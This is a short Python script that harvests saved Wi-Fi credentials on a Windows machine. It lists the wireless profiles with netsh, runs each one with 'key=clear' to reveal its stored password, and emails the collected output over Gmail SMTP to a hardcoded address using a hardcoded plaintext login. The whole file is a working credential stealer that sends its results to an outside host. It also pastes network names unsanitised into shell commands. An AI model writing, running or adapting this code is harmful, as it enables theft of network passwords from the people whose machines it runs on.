#!/usr/bin/env python

import subprocess
import smtplib
import re

# send email with message
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True) 
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)            # \s* multiple space \s one space ?: for not recorded in output

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
    
send_mail("davidlw0812@gmail.com", "QAZqwe123", result)
